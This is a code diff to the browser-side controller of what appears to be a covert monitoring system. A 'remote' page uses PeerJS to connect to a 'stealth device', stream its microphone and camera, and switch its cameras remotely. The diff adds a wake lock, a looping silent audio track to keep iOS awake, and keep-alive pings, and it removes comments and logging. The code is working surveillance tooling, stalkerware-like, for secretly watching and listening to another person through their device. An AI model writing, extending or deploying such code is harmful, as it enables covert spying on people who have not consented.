@@ -159,6 +159,7 @@
         let dataConn = null;
         let mediaCall = null;
         let isVideoMode = false;
+        let keepAliveInterval = null;
 
         const connectBtn    = document.getElementById('connectBtn');
         const audioOnlyBtn  = document.getElementById('audioOnlyBtn');
@@ -171,6 +172,50 @@
         const callStatus    = document.getElementById('callStatus');
         const videoContainer = document.getElementById('videoContainer');
         const remoteVideo   = document.getElementById('remoteVideo');
+
+        // Prevent screen lock
+        function preventScreenLock() {
+            // Request wake lock to prevent screen from sleeping
+            if ('wakeLock' in navigator) {
+                let wakeLock = null;
+                
+                const requestWakeLock = async () => {
+                    try {
+                        wakeLock = await navigator.wakeLock.request('screen');
+                        console.log('[REMOTE] Screen wake lock acquired');
+                        wakeLock.addEventListener('release', () => {
+                            console.log('[REMOTE] Screen wake lock released');
+                        });
+                    } catch (err) {
+                        console.log(`[REMOTE] Wake lock error: ${err.message}`);
+                    }
+                };
+                
+                requestWakeLock();
+                
+                // Re-request wake lock when page becomes visible again
+                document.addEventListener('visibilitychange', () => {
+                    if (!document.hidden && wakeLock === null) {
+                        requestWakeLock();
+                    }
+                });
+            }
+            
+            // Also play silent audio to keep iOS awake
+            const silentAudio = new Audio();
+            silentAudio.src = 'data:audio/mp3;base64,SUQzBAAAAAABEVRYWFgAAAAtAAADY29tbWVudABCaWdTb3VuZEJhbmsuY29tIC8gTGFTb25vdGhlcXVlLm9yZwBURU5DAAAAHQAAA1N3aXRjaCBQbHVzIMKpIE5DSCBTb2Z0d2FyZQBUSVQyAAAABgAAAzIyMzUAVFNTRQAAAA8AAANMYXZmNTcuODMuMTAwAAAAAAAAAAAAAAD/80DEAAAAA0gAAAAATGFWZjU3LjgzLjEwMAAAAAAAAAAAAAAA//tQxAADBkIiGbgG4AbW0dYNwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
+            silentAudio.loop = true;
+            silentAudio.volume = 0;
+            silentAudio.play().catch(e => console.log('Silent audio for iOS:', e));
+            
+            // Keep alive ping every 15 seconds
+            keepAliveInterval = setInterval(() => {
+                if (dataConn && dataConn.open) {
+                    dataConn.send({ type: 'ping', timestamp: Date.now() });
+                    console.log('[REMOTE] Keep-alive ping sent');
+                }
+            }, 15000);
+        }
 
         function setStatus(connected) {
             if (connected) {
@@ -192,47 +237,40 @@
             }
         }
 
-        // Send command to stealth device via data connection
         function sendCameraCommand(camera) {
             if (!dataConn) {
-                callStatus.innerText = '❌ Data channel not ready - please reconnect';
-                console.error('No data connection available');
+                callStatus.innerText = '❌ Data channel not ready';
                 return;
             }
             
-            console.log(`[REMOTE] Sending camera switch command to stealth: ${camera}`);
+            console.log(`[REMOTE] Sending camera switch: ${camera}`);
             dataConn.send({
                 type: 'camera_switch',
                 camera: camera
             });
             
-            // Update button active states
             if (camera === 'front') {
                 frontCameraBtn.classList.add('active');
                 backCameraBtn.classList.remove('active');
-                callStatus.innerText = '📱 Command sent: Switch to Front Camera';
+                callStatus.innerText = '📱 Switching to Front Camera...';
             } else {
                 frontCameraBtn.classList.remove('active');
                 backCameraBtn.classList.add('active');
-                callStatus.innerText = '📷 Command sent: Switch to Back Camera';
+                callStatus.innerText = '📷 Switching to Back Camera...';
             }
             
             setTimeout(() => {
-                if (callStatus.innerText.includes('Command sent')) {
+                if (callStatus.innerText.includes('Switching')) {
                     callStatus.innerText = `👁️ ${isVideoMode ? 'Video + Audio' : 'Audio Only'} monitor ACTIVE`;
                 }
             }, 2000);
         }
 
-        // Create silent audio stream for audio-only calls (remote sends nothing)
         async function makeSilentAudioStream() {
             try {
-                // Try to get a stream with audio disabled
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: false, video: false });
                 return stream;
             } catch (e) {
-                console.log('Creating empty stream');
-                // Fallback: create empty stream
                 return new MediaStream();
             }
         }
@@ -247,12 +285,9 @@
                 isVideoMode = withVideo;
                 callStatus.innerText = `📡 Starting ${withVideo ? 'video' : 'audio'} monitor...`;
 
-                // Remote sends NOTHING to stealth (no audio, optional video for call setup)
                 let streamToSend = null;
                 
                 if (withVideo) {
-                    // For video calls, send a tiny video stream (no audio)
-                    // This is REQUIRED for PeerJS to establish a video call
                     try {
                         const constraints = {
                             audio: false,
@@ -263,15 +298,12 @@
                             }
                         };
                         streamToSend = await navigator.mediaDevices.getUserMedia(constraints);
-                        console.log('[REMOTE] Local camera acquired for call setup');
                     } catch (e) {
-                        console.warn('[REMOTE] No local camera, using empty stream');
                         streamToSend = await makeSilentAudioStream();
                     }
                     videoContainer.classList.add('active');
                     cameraControls.style.display = 'flex';
                 } else {
-                    // Audio only - send empty stream (no audio from remote)
                     streamToSend = await makeSilentAudioStream();
                     cameraControls.style.display = 'none';
                 }
@@ -281,39 +313,27 @@
                 });
 
                 mediaCall.on('stream', (remoteStream) => {
-                    console.log('[REMOTE] Received stream from stealth');
-                    
-                    // Display stealth video if available
                     if (remoteStream.getVideoTracks().length > 0) {
                         remoteVideo.srcObject = remoteStream;
-                        remoteVideo.play().catch(e => console.log('Video play error:', e));
+                        remoteVideo.play().catch(e => console.log('Video error:', e));
                     }
                     
-                    // Play stealth audio
                     if (remoteStream.getAudioTracks().length > 0) {
                         const stealthAudio = new Audio();
                         stealthAudio.srcObject = remoteStream;
-                        stealthAudio.play().catch(e => console.log('Audio play error:', e));
-                        console.log('[REMOTE] Audio playback started from stealth');
-                        callStatus.innerText = `🔊 Audio Only monitor ACTIVE`;
-                    } else if (withVideo) {
-                        callStatus.innerText = `📹 Video monitor ACTIVE`;
+                        stealthAudio.play().catch(e => console.log('Audio error:', e));
                     }
                     
+                    callStatus.innerText = `👁️ ${withVideo ? 'Video + Audio' : 'Audio Only'} monitor ACTIVE`;
                     audioOnlyBtn.disabled = true;
                     videoCallBtn.disabled = true;
                     endCallBtn.disabled = false;
                 });
 
-                mediaCall.on('close', () => { console.log('[REMOTE] Call closed'); endCall(); });
-                mediaCall.on('error', (err) => { 
-                    console.error('[REMOTE] Call error:', err); 
-                    callStatus.innerText = '❌ Call failed - check stealth device';
-                    endCall(); 
-                });
+                mediaCall.on('close', () => { endCall(); });
+                mediaCall.on('error', (err) => { endCall(); });
 
             } catch (err) {
-                console.error('[REMOTE] Start call error:', err);
                 callStatus.innerText = '❌ Failed to start monitor';
                 endCall();
             }
@@ -344,7 +364,6 @@
             setStatus(true);
             callStatus.innerText = '✅ Connected - Ready to monitor';
             
-            // Setup data connection for camera commands
             dataConn = conn;
             
             conn.on('close', () => { 
@@ -359,7 +378,6 @@
             if (conn) { callStatus.innerText = '✅ Already connected'; return; }
             callStatus.innerText = '🔍 Locating stealth device...';
             
-            // Create data connection first for commands
             const dataConnection = peer.connect(PARTNER_ID);
             
             dataConnection.on('open', () => {
@@ -369,7 +387,6 @@
             });
             
             dataConnection.on('error', (err) => {
-                console.error('[REMOTE] Connection error:', err);
                 callStatus.innerText = '❌ Stealth device offline';
                 setStatus(false);
             });
@@ -379,24 +396,24 @@
             peer = new Peer(MY_ID);
             peer.on('open', () => { 
                 callStatus.innerText = '✅ Remote ready - Click Connect'; 
-                console.log('[REMOTE] PeerJS initialized with ID:', MY_ID);
             });
             peer.on('error', (err) => {
-                console.error('[REMOTE] Peer error:', err);
-                if (err.type === 'unavailable-id') callStatus.innerText = '❌ Remote ID in use - Close other tabs';
+                if (err.type === 'unavailable-id') callStatus.innerText = '❌ Remote ID in use';
             });
+            
+            // Prevent screen lock
+            preventScreenLock();
         }
 
         connectBtn.addEventListener('click', connectToPartner);
         audioOnlyBtn.addEventListener('click', () => startCall(false));
         videoCallBtn.addEventListener('click', () => startCall(true));
         endCallBtn.addEventListener('click', endCall);
-        
-        // Send commands to stealth device to switch its camera
         frontCameraBtn.addEventListener('click', () => sendCameraCommand('front'));
         backCameraBtn.addEventListener('click', () => sendCameraCommand('back'));
 
         window.addEventListener('beforeunload', () => {
+            if (keepAliveInterval) clearInterval(keepAliveInterval);
             if (conn) conn.close();
             if (peer) peer.destroy();
         });
